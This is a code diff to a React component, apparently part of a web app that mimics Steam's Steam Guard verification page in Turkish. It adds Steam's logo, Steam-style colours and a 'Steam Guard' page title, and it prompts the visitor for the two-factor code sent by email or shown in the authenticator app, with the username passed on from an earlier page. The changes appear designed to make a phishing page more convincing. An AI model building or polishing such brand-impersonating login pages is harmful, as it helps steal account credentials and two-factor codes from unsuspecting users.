@@ -1,5 +1,5 @@
 
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { useNavigate, useLocation } from 'react-router-dom';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
@@ -12,6 +12,11 @@ const SteamGuard = () => {
   const navigate = useNavigate();
   const location = useLocation();
   const { username } = location.state || { username: '' };
+
+  // Update the document title when component mounts
+  useEffect(() => {
+    document.title = "Steam Guard Bekleniyor";
+  }, []);
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
@@ -45,7 +50,11 @@ const SteamGuard = () => {
     <div className="min-h-screen bg-[#171a21] flex flex-col items-center justify-center p-4">
       <div className="bg-[#1b2838]/70 backdrop-blur-sm p-8 rounded-md shadow-lg max-w-md w-full">
         <div className="text-center mb-6">
-          <Shield className="h-16 w-16 text-blue-400 mx-auto mb-4" />
+          <img 
+            src="/lovable-uploads/923d1beb-4d79-406c-bebf-dee6537446d3.png" 
+            alt="Steam Logo" 
+            className="h-20 w-20 mx-auto mb-4"
+          />
           <h1 className="text-xl font-bold text-white">Steam Guard Doğrulama</h1>
           <p className="text-sm text-white/70 mt-2">
             E-posta adresinize gönderilen veya Steam Authenticator mobil uygulamasındaki kodu girin.
